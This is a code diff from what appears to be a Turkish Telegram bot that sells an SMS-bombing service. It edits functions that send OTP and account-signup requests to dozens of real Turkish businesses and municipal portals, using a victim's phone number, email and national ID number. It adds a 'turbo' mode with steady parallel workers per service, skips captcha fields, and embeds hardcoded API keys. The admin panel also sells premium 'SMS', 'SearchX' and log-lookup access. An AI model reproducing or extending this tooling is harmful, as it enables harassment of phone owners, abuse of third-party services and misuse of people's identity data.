-            r = requests.post("https://api.frink.com.tr:443/api/auth/postSendOTP", json={"areaCode":"90","etkContract":True,"language":"TR","phoneNumber":"90"+self.phone}, timeout=6)
+            r = self.session.post("https://api.frink.com.tr:443/api/auth/postSendOTP", json={"areaCode":"90","etkContract":True,"language":"TR","phoneNumber":"90"+self.phone}, timeout=self.req_timeout)
             if r.json().get("processStatus") == "SUCCESS": self.adet += 1
         except: pass
     def Bodrum(self):
         try:
-            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
+            r = self.session.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                 json={"gsm":"+90"+self.phone,"source":"orwi"},
-                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=6)
+                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def KofteciYusuf(self):
         try:
             url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
             headers = {"Content-Type":"application/json; charset=utf-8","Accept":"application/json","Ostype":"iOS","Appversion":"4.0.4.0","Firmaid":"82","User-Agent":"YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
-            r = requests.post(url, headers=headers, json={"FireBaseCihazKey":None,"FirmaId":82,"GuvenlikKodu":None,"Telefon":self.phone}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"FireBaseCihazKey":None,"FirmaId":82,"GuvenlikKodu":None,"Telefon":self.phone}, timeout=self.req_timeout)
             if r.json().get("Success") is True:
                 self._ok("KofteciYusuf")
             else:
@@ -5380,22 +5360,22 @@ class SendSms:
 
     def Little(self):
         try:
-            r = requests.post("https://api.littlecaesars.com.tr:443/api/web/Member/Register",
-                json={"CampaignInform":True,"Email":self.mail,"InfoRegister":True,"IsLoyaltyApproved":True,"NameSurname":"Memati Bas","Password":"31ABC..abc31","Phone":self.phone,"SmsInform":True}, timeout=6)
+            r = self.session.post("https://api.littlecaesars.com.tr:443/api/web/Member/Register",
+                json={"CampaignInform":True,"Email":self.mail,"InfoRegister":True,"IsLoyaltyApproved":True,"NameSurname":"Memati Bas","Password":"31ABC..abc31","Phone":self.phone,"SmsInform":True}, timeout=self.req_timeout)
             if r.status_code == 200 and r.json().get("status") == True: self.adet += 1
         except: pass
     def Orwi(self):
         try:
-            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
+            r = self.session.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                 json={"gsm":"+90"+self.phone,"source":"orwi"},
-                headers={"Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg","Content-Type":"application/json"}, timeout=6)
+                headers={"Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg","Content-Type":"application/json"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Coffy(self):
         try:
             url = "https://user-api-gw.coffy.com.tr:443/user/signup"
             headers = {"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Language":"tr","User-Agent":"coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
-            r = requests.post(url, headers=headers, json={"countryCode":"90","gsm":self.phone,"isKVKKAgreementApproved":True,"isUserAgreementApproved":True,"name":"Memati Bas"}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"countryCode":"90","gsm":self.phone,"isKVKKAgreementApproved":True,"isUserAgreementApproved":True,"name":"Memati Bas"}, timeout=self.req_timeout)
             if r.status_code == 200:
                 self._ok("Coffy")
             else:
@@ -5405,7 +5385,7 @@ class SendSms:
 
     def Hamidiye(self):
         try:
-            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp", json={"isGuest":False,"phone":self.phone}, timeout=6)
+            r = self.session.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp", json={"isGuest":False,"phone":self.phone}, timeout=self.req_timeout)
             if r.json().get("result") == True: self.adet += 1
         except: pass
     def Money(self):
@@ -5413,7 +5393,7 @@ class SendSms:
             url = "https://www.money.com.tr/Account/ValidateAndSendOTP"
             headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.money.com.tr/money-kartiniz-var-mi","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest","Origin":"https://www.money.com.tr"}
             data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ""}
-            r = requests.post(url, headers=headers, data=data, timeout=10)
+            r = self.session.post(url, headers=headers, data=data, timeout=self.req_timeout)
             if r.json().get("resultType") == 0:
                 self._ok("Money")
             else:
@@ -5425,7 +5405,7 @@ class SendSms:
         try:
             url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
             headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.alixavien.com.tr/","Content-Type":"application/json","Origin":"https://www.alixavien.com.tr"}
-            r = requests.post(url, headers=headers, json={"Phone":self.phone,"XID":""}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"Phone":self.phone,"XID":""}, timeout=self.req_timeout)
             if r.json().get("isError") is False:
                 self._ok("Alixavien")
             else:
@@ -5435,7 +5415,7 @@ class SendSms:
 
     def Jimmykey(self):
         try:
-            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=10)
+            r = self.session.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=self.req_timeout)
             if r.json().get("Sonuc") is True:
                 self._ok("Jimmykey")
             else:
@@ -5445,26 +5425,26 @@ class SendSms:
 
     def Ido(self):
         try:
-            r = requests.post("https://api.ido.com.tr:443/idows/v2/register",
-                json={"birthDate":True,"captcha":"","checkPwd":"313131","code":"","day":24,"email":self.mail,"emailNewsletter":False,"firstName":"MEMATI","gender":"MALE","lastName":"BAS","mobileNumber":"0"+self.phone,"month":9,"pwd":"313131","smsNewsletter":True,"tckn":self.tc,"termsOfUse":True,"year":1977}, timeout=6)
+            r = self.session.post("https://api.ido.com.tr:443/idows/v2/register",
+                json={"birthDate":True,"captcha":"","checkPwd":"313131","code":"","day":24,"email":self.mail,"emailNewsletter":False,"firstName":"MEMATI","gender":"MALE","lastName":"BAS","mobileNumber":"0"+self.phone,"month":9,"pwd":"313131","smsNewsletter":True,"tckn":self.tc,"termsOfUse":True,"year":1977}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Fatih(self):
         try:
-            r = requests.post("https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet",
-                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"28.12.1999","SahisUyelik.Ad":"Memati","SahisUyelik.Soyad":"Bas","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
+            r = self.session.post("https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet",
+                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"28.12.1999","SahisUyelik.Ad":"Memati","SahisUyelik.Soyad":"Bas","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Sancaktepe(self):
         try:
-            r = requests.post("https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet",
-                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"13.01.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
+            r = self.session.post("https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet",
+                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"13.01.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Bayrampasa(self):
         try:
-            r = requests.post("https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet",
-                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"07.06.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
+            r = self.session.post("https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet",
+                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"07.06.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
 
@@ -5514,7 +5494,9 @@ def _sms_worker(phone, mail, mode, limit, interval, stop_event, uid, bot_instanc
         def _tick(force=False):
             nonlocal last_edit
             now = time.time()
-            if not force and now - last_edit < 2.5:
+            # turbo daha sik guncelle
+            min_gap = 1.2 if mode == "turbo" else 2.5
+            if not force and now - last_edit < min_gap:
                 return
             last_edit = now
             with _SMS_LOCK:
@@ -5533,34 +5515,50 @@ def _sms_worker(phone, mail, mode, limit, interval, stop_event, uid, bot_instanc
                     pass
 
         if mode == "turbo":
-            while not stop_event.is_set():
-                threads = []
-                before = sms.adet
-                for fn in services:
-                    if stop_event.is_set():
+            # Her servis icin 2 sabit worker — es zamanli, surekli, session keep-alive
+            svc_list = list(services)
+            workers_per_service = 2
+
+            def _worker_loop(name):
+                while not stop_event.is_set():
+                    if limit and sms.adet >= limit:
+                        stop_event.set()
                         break
-                    def _run(name=fn):
-                        prev = sms.adet
-                        try:
-                            getattr(sms, name)()
-                            if sms.adet == prev:
-                                sms._fail(name)
-                            else:
-                                sms.last_ok = name
-                        except Exception:
-                            sms._fail(name)
-                    t = threading.Thread(target=_run, daemon=True)
-                    threads.append(t)
-                    t.start()
-                for t in threads:
+                    prev = sms.adet
                     try:
-                        t.join(timeout=6)
+                        getattr(sms, name)()
+                        if sms.adet == prev:
+                            sms._fail(name)
+                        else:
+                            sms.last_ok = name
                     except Exception:
-                        pass
+                        try:
+                            sms._fail(name)
+                        except Exception:
+                            pass
+
+            workers = []
+            for fn in svc_list:
+                for _ in range(workers_per_service):
+                    th = threading.Thread(target=_worker_loop, args=(fn,), daemon=True)
+                    workers.append(th)
+                    th.start()
+
+            while not stop_event.is_set():
                 _tick()
                 if limit and sms.adet >= limit:
                     stop_event.set()
                     break
+                time.sleep(1.0)
+            try:
+                sms.session.close()
+            except Exception:
+                pass
+            for th in workers:
+                try:
+                    th.join(timeout=0.2)
+                except Exception:
+                    pass
         else:
             while not stop_event.is_set():
                 for fn in services:
@@ -6457,29 +6455,29 @@ def register_handlers(bot_instance):
             bot_instance.reply_to(msg, s(uid, "admin_only")); return
         mk = InlineKeyboardMarkup(row_width=2)
         mk.add(
-            _btn("📊 Bot İstatistik", "adm_stats", "primary"),
-            _btn("📡 Bot Durumu", "adm_status", "primary"),
-            _btn("🛠️ Bakım Aç/Kapat", "adm_maint", "danger"),
-            _btn("⚠️ Hata Özeti", "adm_errors", "danger"),
-            _btn("⭐ Premium Kullanıcılar", "adm_prem_users", "success"),
-            _btn("📋 Premium Log", "adm_prem_log", "primary"),
-            _btn("⭐ Premium Ver", "adm_give_premium", "success"),
-            _btn("➖ Premium Kaldır", "adm_remove", "danger"),
-            _btn("🚫 Kullanıcı Banla", "adm_ban", "danger"),
-            _btn("✅ Kullanıcı Ban Kaldır", "adm_unban", "success"),
-            _btn("📋 Yasaklı Listesi", "adm_banned", "primary"),
-            _btn("📢 Duyuru Gönder", "adm_announce", "success"),
-            _btn("🤖 Tüm Botları Listele", "adm_listbots", "primary"),
-            _btn("📋 Hotmail Log", "adm_hotmail_log", "primary"),
-            _btn("🆔 TG-ID Bakiye Ver", "adm_tgid_give", "success"),
-            _btn("➖ TG-ID Bakiye Al", "adm_tgid_take", "danger"),
-            _btn("📋 TG-ID Logları", "adm_tgid_logs", "primary"),
-            _btn("💰 TG-ID Satın Almalar", "adm_tgid_purchases", "primary"),
-            _btn("📂 LOG Premium Ver", "adm_log_give", "success"),
-            _btn("💣 SMS Premium Ver", "adm_sms_give", "success"),
-            _btn("😈 SearchX Premium Ver", "adm_lmnx_give", "success"),
-            _btn("🎨 AI Image Bakiye Ver", "adm_aiimg_give", "success"),
-            _btn("➖ AI Image Bakiye Al", "adm_aiimg_take", "danger"),
+            _btn("Bot İstatistik", "adm_stats", "primary", "stats"),
+            _btn("Bot Durumu", "adm_status", "primary", "stats"),
+            _btn("Bakım Aç/Kapat", "adm_maint", "danger", "warning"),
+            _btn("Hata Özeti", "adm_errors", "danger", "warning"),
+            _btn("Premium Kullanıcılar", "adm_prem_users", "success", "star"),
+            _btn("Premium Log", "adm_prem_log", "primary", "log"),
+            _btn("Premium Ver", "adm_give_premium", "success", "star"),
+            _btn("Premium Kaldır", "adm_remove", "danger", "trash"),
+            _btn("Kullanıcı Banla", "adm_ban", "danger", "ban"),
+            _btn("Ban Kaldır", "adm_unban", "success", "check"),
+            _btn("Yasaklı Listesi", "adm_banned", "primary", "ban"),
+            _btn("Duyuru Gönder", "adm_announce", "success", "announce"),
+            _btn("Tüm Botları Listele", "adm_listbots", "primary", "ai"),
+            _btn("Hotmail Log", "adm_hotmail_log", "primary", "hotmail"),
+            _btn("TG-ID Bakiye Ver", "adm_tgid_give", "success", "id"),
+            _btn("TG-ID Bakiye Al", "adm_tgid_take", "danger", "trash"),
+            _btn("TG-ID Logları", "adm_tgid_logs", "primary", "log"),
+            _btn("TG-ID Satın Almalar", "adm_tgid_purchases", "primary", "dollar"),
+            _btn("LOG Premium Ver", "adm_log_give", "success", "log"),
+            _btn("SMS Premium Ver", "adm_sms_give", "success", "sms"),
+            _btn("SearchX Premium Ver", "adm_lmnx_give", "success", "searchx"),
+            _btn("AI Image Bakiye Ver", "adm_aiimg_give", "success", "image"),
+            _btn("AI Image Bakiye Al", "adm_aiimg_take", "danger", "trash"),
         )
         bot_instance.reply_to(msg, "👑 <b>ADMIN PANELİ</b>", reply_markup=mk)
 
